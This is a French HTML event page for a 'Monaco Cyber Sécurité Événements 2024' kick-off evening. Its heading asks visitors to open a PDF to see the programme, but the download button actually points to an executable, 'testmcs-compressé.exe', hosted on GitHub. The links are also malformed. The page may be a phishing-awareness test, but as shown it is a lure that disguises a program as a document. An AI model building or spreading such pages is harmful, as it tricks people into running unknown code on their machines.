<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Programme de la soirée Kick OFF annuel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: black; /* Fond noir */
            color: white; /* Texte blanc par défaut */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden; /* Empêche le scroll */
            position: relative; /* Pour le positionnement des confettis */
        }
        h1 {
            color: red; /* Couleur du texte du h1 en rouge */
        }
        .banner {
            background-color: black; /* Fond du bandeau noir */
            color: red; /* Couleur du texte en rouge */
            text-align: center;
            padding: 20px; /* Plus de padding pour un bandeau plus large */
            width: 100%;
            position: absolute;
            top: 0;
            font-size: 24px; /* Taille de police augmentée pour le bandeau */
        }
        .download-btn {
            margin-top: 20px;
            padding: 10px 15px;
            background-color: red; /* Couleur rouge */
            color: white; /* Texte en blanc */
            text-decoration: none;
            border-radius: 5px;
            text-align: center;
        }
        .download-btn:hover {
            background-color: darkred; /* Couleur au survol */
        }
        .confetti {
            position: absolute;
            top: -10px; /* Commence un peu au-dessus de l'écran */
            width: 10px;
            height: 10px;
            opacity: 0.8;
            animation: fall 1.5s forwards; /* Durée de l'animation */
        }
        @keyframes fall {
            to {
                transform: translateY(100vh);
                opacity: 0; /* Disparaît à la fin de la chute */
            }
        }
    </style>
</head>
<body>
    <div class="banner">
        Monaco Cyber Sécurité Événements 2024
    </div>
    <h1>Afin de visualiser les événements de cette soirée veuillez afficher le PDF</h1>
    <p>Que la fête commence !</p>
    <a class="download-btn" <a href="https://github.com/sndcrt/site-web-/raw/main/testmcs-compress%C3%A9.exe" download>Télécharger le fichier</a>
<a href="https://github.com/sndcrt/site-web-/raw/refs/heads/main/testmcs-compress%C3%A9.exe"</a>


    <script>
        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            confetti.style.left = Math.random() * 100 + 'vw'; // Position horizontale aléatoire
            confetti.style.backgroundColor = 'hsl(' + Math.random() * 360 + ', 100%, 50%)'; // Couleur aléatoire
            document.body.appendChild(confetti);

            // Supprime le confetti après l'animation
            confetti.addEventListener('animationend', () => {
                confetti.remove();
            });
        }

        setInterval(createConfetti, 100); // Crée un confetti toutes les 100ms
    </script>
</body>
</html>
